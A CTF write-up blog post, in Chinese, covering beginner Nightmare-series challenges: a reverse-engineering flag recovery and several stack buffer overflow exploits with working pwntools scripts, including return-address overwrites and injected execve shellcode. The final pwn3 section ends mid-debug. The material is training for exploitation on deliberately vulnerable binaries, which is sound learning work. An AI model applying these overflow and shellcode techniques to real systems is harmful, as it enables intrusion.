---
title: 'Writeups: Nightmare Series'
date: '2024-07-24'
lastmod: '2024-07-30'
tags: ['CTF','Writeup', 'Pwn', 'Nightmare']
draft: false
summary: 'Writeups for Nightmare Series'
authors: ['default']
---

<div className="border-solid border-2 border-surface0 dark:border-surface0-dark p-2 bg-base dark:bg-base-dark mt-5">
  <TOCInline toc={props.toc} asDisclosure />
</div>

## CSAW 2019 beleaf

### Information

 - Category: Reverse
 - Points: 50

### Description

> tree sounds are best listened to by https://binary.ninja/demo or ghidra

<Download name="beleaf" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/03-beginner_re/csaw19_beleaf/beleaf" type="Binary" />

### Writeup

简单运行一下程序：

```plain-text
λ ~/ ./beleaf
Enter the flag
>>> i dont have the fucking flag
Incorrect!
```

一些基本信息：

```plain-text
λ ~/ file beleaf
beleaf: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6d305eed7c9bebbaa60b67403a6c6f2b36de3ca4, stripped
```

大概可以推测出我们的目标就是弄到一个正确的 `flag`。

丢到 IDA 里发现，输入长度小于等于 32 (0x20) 会输出 `Incorrect!`，所以 `flag` 长度起码 33 字节。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9i4O.png" width={1920} height={1080} />
</center>

接下来进入一个简单的 for 循环，将我们输入的每一个字符逐一放到 `calc_idx` 函数中，并将返回值与 `valid_arr[i]` 比较，如果不等于 `valid_arr[i]` 则输出 `Incorrect!`。如果所有字符都通过了验证，则输出 `Correct!`

再看看 `calc_idx` 函数，大致可以看出它的作用是根据传入的字符查找它在 `charset` 中对应的索引。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/24/pkb9kCD.png" width={1920} height={1080} />
</center>

`calc_idx` 的核心如下：

 - `character == charset[i]` 则返回索引 `i`
 - `character >= charset[i]` 则设置索引为 `i = 2 * (i + 1)`
 - 否则设置索引为 `i = 2 * i + 1`

因此我们构造 `flag` 的关键条件就是：

 - `flag` 长度 >= 33
 - `calc_idx(input[i]) == valid_arr[i]`

### Exploit

```python
#!/usr/bin/python3

import sys

valid_arr = [
    0x01, 0x09, 0x11, 0x27, 0x02,
    0x00, 0x12, 0x03, 0x08, 0x12,
    0x09, 0x12, 0x11, 0x01, 0x03,
    0x13, 0x04, 0x03, 0x05, 0x15,
    0x2E, 0x0A, 0x03, 0x0A, 0x12,
    0x03, 0x01, 0x2E, 0x16, 0x2E,
    0x0A, 0x12, 0x06
]

charset = [
    0x00000077, 0x00000066, 0x0000007B, 0x0000005F, 0x0000006E,
    0x00000079, 0x0000007D, 0xFFFFFFFF, 0x00000062, 0x0000006C,
    0x00000072, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0x00000061, 0x00000065, 0x00000069,
    0xFFFFFFFF, 0x0000006F, 0x00000074, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0x00000067,
    0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF, 0xFFFFFFFF,
    0xFFFFFFFF, 0x00000075
]

def create_charset():
    result = ''

    for c in charset:
        try:
            result += chr(c)
        except OverflowError:
            continue

    return result

def checker(char):
    i = 0
    while char != charset[i]:
        if char >= charset[i]:
            i = 2 * (i + 1)
        else:
            i = 2 * i + 1
    return i

def main():
    charset = create_charset()

    i = 0
    while (i < 33):
        for c in charset:
            if checker(ord(c)) == valid_arr[i]:
                sys.stdout.write(c)
        i += 1

if __name__ == '__main__':
    main()
```

### Flag

Flag: `flag{we_beleaf_in_your_re_future}`

## CSAW 2018 Quals Boi

### Information

 - Category: Pwn
 - Points: 25

### Description

> Only big boi pwners will get this one!

<Download name="boi" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/csaw18_boi/boi" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
λ ~/ pwn checksec boi
[*] '/home/cub3y0nd/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

试运行一下，发现它只是输出系统时间：

```plain-text
λ ~/ ./boi
Are you a big boiiiii??
aaaa
Thu Jul 25 05:35:00 PM CST 2024
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbJ5H1.png" width={1920} height={1080} />
</center>

从 IDA 里面可以看出，程序可以将一个 24 (0x18) 字节 数据读入 `buf` 中。如果 `v5` 的 HIDWORD（高位四字节）等于 `0xCAF3BAEE` 则返回 shell，否则返回系统时间。

所以我们的思路就是溢出，然后覆盖原始数据。

下面是两种得到溢出点的方法：

1. 由于 `buf` 只有 16 字节大小（2 * __int64），而 `read` 却可以读取 24 字节数据，所以这里存在栈溢出漏洞，可以覆盖变量 `v5` 的内容。所以 payload 可以是 16（填满 buf） + 4（填满 4 字节低位使后面的数据可以直接覆盖高位数据，也就是做判断的部分） 字节垃圾数据 + `0xCAF3BAEE`。
2. 通过调试知道溢出点是 20 (0x14)：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/25/pkbYnU0.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./boi')

payload = b'A' * 0x14 + p32(0xcaf3baee)

target.send(payload)
target.interactive()
```

### Flag

Flag: `flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}`

## TAMU 2019 pwn1

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="pwn1" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tamu19_pwn1/pwn1" type="Binary" />

### Writeup

```plain-text
λ ~/ file boi
pwn1: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=d126d8e3812dd
7aa1accb16feac888c99841f504, not stripped
λ ~/ pwn checksec pwn1
[*] '/home/cub3y0nd/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```plain-text
λ ~/ ./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
aaaa
I don't know that! Auuuuuuuugh!
```

咋一看好像没啥东西，丢到 IDA 里面瞧瞧：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/26/pkb4IlF.png" width={1920} height={1080} />
</center>

显然，根据伪代码可以轻易的知道如何绕过前两问的输入。然后第三问采用了一个 `gets()` 函数接收输入，输入保存到一个 43 字节大小的字符数组里面。由于 `gets()` 不检查输入大小，因此超过 `input` 容量的内容会溢出到 `v5`。最后如果 `v5 == 0xDEA110C8` 则输出 `flag`。

所以思路就是先回答前两问，然后填满 `input`，将 `0xDEA110C8` 溢出到变量 `v5`，结束。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pwn1')

recvuntil = lambda str : print(target.recvuntil(str))

payload = b'A' * 0x2b + p32(0xdea110c8)

recvuntil(b'What... is your name?')
target.sendline(b'Sir Lancelot of Camelot')
recvuntil(b'What... is your quest?')
target.sendline(b'To seek the Holy Grail.')
recvuntil(b'What... is my secret?')
target.sendline(payload)
target.interactive()
```

### Flag

Flag: `flag{g0ttem_b0yz}`

## Tokyo Westerns CTF 3rd 2017 JustDoIt

### Information

 - Category: Pwn
 - Points: Unknow

### Description

> Unknow

<Download name="just_do_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/04-bof_variable/tw17_justdoit/just_do_it" type="Binary" />

### Writeup

```plain-text
λ ~/ file just_do_it
just_do_it: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cf72d1d758e59a5b9912e0e83c3af92175c6f629, not stripped
λ ~/ pwn checksec just_do_it
[*] '/home/cub3y0nd/just_do_it'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plain-text
λ ~/ ./just_do_it
Welcome my secret service. Do you know the password?
Input the password.
aaaa
Invalid Password, Try Again!
```

可能是要获得密码打印 `flag`，丢到 IDA 看看：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmom8.png" width={1920} height={1080} />
</center>

看伪代码发现，就算提供了正确的密码也只是输出一条消息而已，得到密码好像并没有什么用。这就是一个障眼法！

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqmLfs.png" width={1920} height={1080} />
</center>

虽然不需要密码，但是如果你好奇密码的话，也不是不行... 通过 IDA 我们知道密码是 `P@SSW0RD`，于是乎：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqn97F.png" width={1920} height={1080} />
</center>

这里即使有了正确的密码还是提示密码错误的原因是 `fgets` 函数会把换行符也读进去。所以我们只需要在密码后面加上空字符 `\0` 就可以去掉换行符了。

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnp0U.png" width={1920} height={1080} />
</center>

扯远了...

通过之前的伪代码可以发现，`fgets` 接收的输入大小远超 `input` 可容纳的大小。因此通过调试可以知道溢出 padding 是 20 字节：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnApR.png" width={1920} height={1080} />
</center>

那么有了溢出 padding 后怎么获取 flag 呢？

由伪代码知，它会从 `stream` 里面读取 48 字节的数据，保存到 `flag` 变量里面。那么我们如果可以直接输出 `flag` 就好了。这里有一个思路是利用之前的溢出漏洞，将 `input` 填满后把 `flag` 变量的地址溢出给 `v6`，这就会导致 `puts` 输出 `flag` 变量的内容。perfect 移花接木

嗯...这样就很清晰了。通过 IDA 直接看 `flag` 在 `.bss` 中的地址：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqnQtH.png" width={1920} height={1080} />
</center>

当然，如果你想验证它是不是真我们所想覆盖了 `v6` 让 `puts` 输出 `flag` 的内容：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/27/pkqntnf.png" width={1920} height={1080} />
</center>

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./just_do_it')

payload = b'A' * 0x14 + p32(0x0804A080)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `TWCTF{pwnable_warmup_I_did_it!}`

## CSAW 2016 Quals Warmup

### Information

 - Category: Pwn
 - Points: 50

### Description

> So you want to be a pwn-er huh? Well let's throw you an easy one ;)

<Download name="warmup" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw16_warmup/warmup" type="Binary" />

### Writeup

```plain-text
λ ~/ file warmup
warmup: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=ab209f3b8a3c2902e1a2ecd5bb06e258b45605a4, not stripped
λ ~/ pwn checksec warmup
[*] '/home/cub3y0nd/warmup'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plain-text
λ ~/ ./warmup
-Warm Up-
WOW:0x40060d
>wow
```

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/28/pkqh8T1.png" width={1920} height={1080} />
</center>

这种题真就是闭着眼睛做... 一眼出思路：溢出 `v5` 覆盖返回地址为 `easy` 函数即可。

值得注意的是首先要了解函数调用约定和栈帧布局，这样才能准确的覆盖返回地址。可以参考下面两篇文章：

 - [C 语言函数调用栈（一）](http://www.cnblogs.com/clover-toeic/p/3755401.html)
 - [C 语言函数调用栈（二）](http://www.cnblogs.com/clover-toeic/p/3756668.html)

还有一点就是确保 [栈对齐](https://www.cubeyond.net/blog/pwn-notes/stack/return-oriented-programming/stack-alignment)。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./warmup')

# payload = b'A' * (64 + 8) + p64(0x40060d + 0x1)
payload = b'A' * (64 + 8) + p64(0x4006a4) + p64(0x40060d)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `FLAG{LET_US_BEGIN_CSAW_2016}`

## CSAW Quals 2018 Get It

### Information

 - Category: Pwn
 - Points: 100

### Description

> Do you get it?

<Download name="get_it" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/csaw18_getit/get_it" type="Binary" />

### Writeup

```plain-text
λ ~/ file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
λ ~/ pwn checksec get_it
[*] '/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```plain-text
λ ~/ ./get_it
Do you gets it??
i will
```
伪代码如下：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[32]; // [rsp+10h] [rbp-20h] BYREF

  puts("Do you gets it??");
  gets(v4);
  return 0;
}
```

```c
int give_shell()
{
  return system("/bin/bash");
}
```

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./get_it')

payload = b'A' * (0x20 + 0x8) + p64(0x4005f7) + p64(0x4005b6)

target.sendline(payload)
target.interactive()
```

### Flag

Flag: `flag{y0u_deF_get_itls}`

## TUCTF 2017 vulnchat

### Information

 - Category: Pwn
 - Points: 50

### Description

> One of our informants goes by the handle djinn. He found some information while working undercover inside an organized crime ring. Although we've had trouble retrieving this information from him. He left us this chat client to talk with him. Let's see if he trusts you...

<Download name="vuln-chat" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/05-bof_callfunction/tu17_vulnchat/vuln-chat" type="Binary" />

### Writeup

```plain-text
λ ~/ file vuln-chat
vuln-chat: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a3caa1805eeeee1454ee76287be398b12b5fa2b7, not stripped
λ ~/ pwn checksec vuln-chat
[*] '/home/cub3y0nd/vuln-chat'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

```plain-text
λ ~/ ./vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: cub3y0nd
Welcome cub3y0nd!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
cub3y0nd: tbh im ur daddy u can trust me LOL
djinn: Sorry. That's not good enough
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4[20]; // [esp+3h] [ebp-2Dh] BYREF
  char v5[20]; // [esp+17h] [ebp-19h] BYREF
  char var5[9]; // [esp+2Bh] [ebp-5h] BYREF

  setvbuf(stdout, 0, 2, 0x14u);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  strcpy(var5, "%30s");
  __isoc99_scanf(var5, v5);
  printf("Welcome %s!\n", v5);
  puts("Connecting to 'djinn'");
  sleep(1u);
  puts("--- 'djinn' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ", v5);
  __isoc99_scanf(var5, v4);
  puts("djinn: Sorry. That's not good enough");
  fflush(stdout);
  return 0;
}
```

```c
int printFlag()
{
  system("/bin/cat ./flag.txt");
  return puts("Use it wisely");
}
```

这题的重点在于 `scanf` 限制了最大输入长度，导致不能直接覆盖返回地址。因此需要先将最大输入长度扩大，下面是调试过程：

```plain-text
pwndbg> b *main+71
Breakpoint 1 at 0x80485d1
pwndbg> b *main+170
Breakpoint 2 at 0x8048634
pwndbg> cyclic 20
aaaabaaacaaadaaaeaaa
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/vuln-chat
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".
----------- Welcome to vuln-chat -------------
Enter your username:
Breakpoint 1, 0x080485d1 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
*EAX  0xffffd5d3 ◂— '%30s'
*EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x8048660 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5d8 ◂— 0x0
*ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
*EIP  0x80485d1 (main+71) —▸ 0xfffe8ae8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x80485d1 <main+71>     call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%30s'
        vararg: 0xffffd5bf ◂— 0x0

   0x80485d6 <main+76>     add    esp, 8
   0x80485d9 <main+79>     lea    eax, [ebp - 19h]
   0x80485dc <main+82>     push   eax
   0x80485dd <main+83>     push   8048759h
   0x80485e2 <main+88>     call   80483e0h                      <printf@plt>

   0x80485e7 <main+93>     add    esp, 8
   0x80485ea <main+96>     push   8048766h
   0x80485ef <main+101>    call   8048410h                      <puts@plt>

   0x80485f4 <main+106>    add    esp, 4
   0x80485f7 <main+109>    push   1
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%30s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5bf ◂— 0x0
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
... ↓        2 skipped
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x80485d1 main+71
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> c
Continuing.
aaaabaaacaaadaaaeaaa%100s
Welcome aaaabaaacaaadaaaeaaa%100s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
aaaabaaacaaadaaaeaaa%100s:
Breakpoint 2, 0x08048634 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────
 EAX  0xffffd5d3 ◂— '%100s'
 EBX  0xf7f92e2c ◂— 0x22ed4c
 ECX  0x0
 EDX  0x0
 EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
 ESI  0x8048660 (__libc_csu_init) ◂— push ebp
 EBP  0xffffd5d8 ◂— 0x0
 ESP  0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
*EIP  0x8048634 (main+170) —▸ 0xfffe27e8 ◂— 0x0
────────────────────────[ DISASM / i386 / set emulate on ]────────────────────────
 ► 0x8048634 <main+170>    call   8048460h                      <__isoc99_scanf@plt>
        format: 0xffffd5d3 ◂— '%100s'
        vararg: 0xffffd5ab ◂— 0xd71424ff

   0x8048639 <main+175>    add    esp, 8
   0x804863c <main+178>    push   80487ech
   0x8048641 <main+183>    call   8048410h                      <puts@plt>

   0x8048646 <main+188>    add    esp, 4
   0x8048649 <main+191>    mov    eax, dword ptr [8049a60h]
   0x804864e <main+196>    push   eax
   0x804864f <main+197>    call   80483f0h                      <fflush@plt>

   0x8048654 <main+202>    add    esp, 4
   0x8048657 <main+205>    mov    eax, 0
   0x804865c <main+210>    leave
────────────────────────────────────[ STACK ]─────────────────────────────────────
00:0000│ esp 0xffffd5a0 —▸ 0xffffd5d3 ◂— '%100s'
01:0004│-034 0xffffd5a4 —▸ 0xffffd5ab ◂— 0xd71424ff
02:0008│-030 0xffffd5a8 ◂— 0xffffffff
03:000c│-02c 0xffffd5ac —▸ 0xf7d71424 ◂— 0x920 /* ' \t' */
04:0010│-028 0xffffd5b0 —▸ 0xf7fbf380 —▸ 0xf7d64000 ◂— 0x464c457f
05:0014│-024 0xffffd5b4 ◂— 0x0
06:0018│-020 0xffffd5b8 ◂— 0x0
07:001c│-01c 0xffffd5bc ◂— 0x61000000
──────────────────────────────────[ BACKTRACE ]───────────────────────────────────
 ► 0 0x8048634 main+170
   1 0xf7d84bd7
   2 0xf7d84c9d __libc_start_main+141
   3 0x8048491 _start+33
──────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x5
0xffffd5d3:	"%100s"
```

有了更大的输入空间后就可以利用第二个 `scanf` 来覆盖返回地址了。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./vuln-chat')

recvuntil   = lambda str : print(target.recvuntil(str))
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b': ')
sendline(b'A' * 0x14 + b'%100s')
recvuntil(b': ')
payload = b'A' * 0x31 + p32(0x804856b)
sendline(payload)
interactive()
```

### Flag

flag: `TUCTF{574ck_5m45h1n6_l1k3_4_pr0}`

## CSAW 2017 pilot

### Information

 - Category: Pwn
 - Points: 100

### Description

> Can I take your order?

<Download name="pilot" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/06-bof_shellcode/csaw17_pilot/pilot" type="Binary" />

### Writeup

```plain-text
λ ~/ file pilot
pilot: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6ed26a43b94fd3ff1dd15964e4106df72c01dc6c, stripped
λ ~/ pwn checksec pilot
[*] '/home/cub3y0nd/pilot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x400000)
    Stack:    Executable
    RWX:      Has RWX segments
```

```plain-text
λ ~/ ./pilot
[*]Welcome DropShip Pilot...
[*]I am your assitant A.I....
[*]I will be guiding you through the tutorial....
[*]As a first step, lets learn how to land at the designated location....
[*]Your mission is to lead the dropship to the right location and execute sequence of instructions to save Marines & Medics...
[*]Good Luck Pilot!....
[*]Location:0x7ffdaefb40d0
[*]Command:self-destruct
```

伪代码如下：

<center>
  <Image alt="untitled" src="https://s21.ax1x.com/2024/07/30/pkLhlbd.png" width={1920} height={1080} />
</center>

可以看到除了 `main` 函数之外就没有别的函数了，那就不是 `ret2win` 题型。

接收的输入大于 `buf` 的大小，存在栈溢出漏洞。由于栈可执行，我们可以尝试运行 shellcode 来 get shell。

在栈中安排 shellcode 的布局如下：因为程序给出了 `buf` 的地址，所以我们可以将 shellcode 插在 `buf` 的头部，然后填满 `buf` 的剩余空间，最后将 `buf` 的起始地址溢出到 `ret` 就实现了执行 shellcode 的逻辑。

### Exploit

```python
#!/usr/bin/python3

from pwn import *

context(os='linux', arch='amd64', log_level='debug', terminal='kitty')

target = process('./pilot')

recvline    = lambda : target.recvline()
recvuntil   = lambda str : target.recvuntil(str)
sendline    = lambda str : target.sendline(str)
interactive = lambda : target.interactive()

recvuntil(b':')
leak_addr = p64(int(recvline(), 16))

shellcode = b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
payload = shellcode + b'A' * (0x28 - len(shellcode)) + leak_addr

sendline(payload)
interactive()
```

### Flag

Flag: `flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}`

## TAMU 2019 pwn3

### Information

 - Category: Pwn
 - Points: 387

### Description

> This challenge tackles stack buffer overflow leading to a shellcode execution.

<Download name="pwn3" href="https://github.com/guyinatuxedo/nightmare/blob/master/modules/06-bof_shellcode/tamu19_pwn3/pwn3" type="Binary" />

### Writeup

```plain-text
λ ~/ file pwn3
pwn3: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=6ea573b4a0896b428db719747b139e6458d440a0, not stripped
λ ~/ pwn checksec pwn3
[*] '/home/cub3y0nd/pwn3'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      PIE enabled
    Stack:    Executable
    RWX:      Has RWX segments
```

```plain-text
λ ~/ ./pwn3
Take this, you might need it on your journey 0xffda23ae!
aight!
```

伪代码：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, (char *)&dword_0 + 2, 0, 0);
  echo(&argc);
  return 0;
}
```

```c
char *echo()
{
  char s[294]; // [esp+Eh] [ebp-12Ah] BYREF

  printf("Take this, you might need it on your journey %p!\n", s);
  return gets(s);
}
```

一开始我还疑惑 `ebp-0x12a` 是个什么东西，后来调试发现和程序给我们的地址是一样的。那就不难想到它是想让我们把 shellcode 塞到这个地址里面。

调试过程如下：

```plain-text
pwndbg> disass main
Dump of assembler code for function main:
   0x000005e3 <+0>:	lea    ecx,[esp+0x4]
   0x000005e7 <+4>:	and    esp,0xfffffff0
   0x000005ea <+7>:	push   DWORD PTR [ecx-0x4]
   0x000005ed <+10>:	push   ebp
   0x000005ee <+11>:	mov    ebp,esp
   0x000005f0 <+13>:	push   ebx
   0x000005f1 <+14>:	push   ecx
   0x000005f2 <+15>:	call   0x629 <__x86.get_pc_thunk.ax>
   0x000005f7 <+20>:	add    eax,0x19d5
   0x000005fc <+25>:	mov    edx,DWORD PTR [eax+0x28]
   0x00000602 <+31>:	mov    edx,DWORD PTR [edx]
   0x00000604 <+33>:	push   0x0
   0x00000606 <+35>:	push   0x0
   0x00000608 <+37>:	push   0x2
   0x0000060a <+39>:	push   edx
   0x0000060b <+40>:	mov    ebx,eax
   0x0000060d <+42>:	call   0x440 <setvbuf@plt>
   0x00000612 <+47>:	add    esp,0x10
   0x00000615 <+50>:	call   0x59d <echo>
   0x0000061a <+55>:	mov    eax,0x0
   0x0000061f <+60>:	lea    esp,[ebp-0x8]
   0x00000622 <+63>:	pop    ecx
   0x00000623 <+64>:	pop    ebx
   0x00000624 <+65>:	pop    ebp
   0x00000625 <+66>:	lea    esp,[ecx-0x4]
   0x00000628 <+69>:	ret
End of assembler dump.
pwndbg> disass echo
Dump of assembler code for function echo:
   0x0000059d <+0>:	push   ebp
   0x0000059e <+1>:	mov    ebp,esp
   0x000005a0 <+3>:	push   ebx
   0x000005a1 <+4>:	sub    esp,0x134
   0x000005a7 <+10>:	call   0x4a0 <__x86.get_pc_thunk.bx>
   0x000005ac <+15>:	add    ebx,0x1a20
   0x000005b2 <+21>:	sub    esp,0x8
   0x000005b5 <+24>:	lea    eax,[ebp-0x12a]
   0x000005bb <+30>:	push   eax
   0x000005bc <+31>:	lea    eax,[ebx-0x191c]
   0x000005c2 <+37>:	push   eax
   0x000005c3 <+38>:	call   0x410 <printf@plt>
   0x000005c8 <+43>:	add    esp,0x10
   0x000005cb <+46>:	sub    esp,0xc
   0x000005ce <+49>:	lea    eax,[ebp-0x12a]
   0x000005d4 <+55>:	push   eax
   0x000005d5 <+56>:	call   0x420 <gets@plt>
   0x000005da <+61>:	add    esp,0x10
   0x000005dd <+64>:	nop
   0x000005de <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x000005e1 <+68>:	leave
   0x000005e2 <+69>:	ret
End of assembler dump.
pwndbg> b *echo+38
Breakpoint 1 at 0x5c3
pwndbg> r
Starting program: /home/cub3y0nd/Projects/CTF/pwn3
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/libthread_db.so.1".

Breakpoint 1, 0x565555c3 in echo ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*EAX  0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
*EBX  0x56556fcc (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ed4
 ECX  0x0
*EDX  0xf7f948a0 ◂— 0x0
*EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0x0
*ESI  0x56555630 (__libc_csu_init) ◂— push ebp
*EBP  0xffffd5c8 —▸ 0xffffd5d8 ◂— 0x0
*ESP  0xffffd480 —▸ 0x565556b0 ◂— push esp /* 'Take this, you might need it on your journey %p!\n' */
*EIP  0x565555c3 (echo+38) —▸ 0xfffe48e8 ◂— 0x0
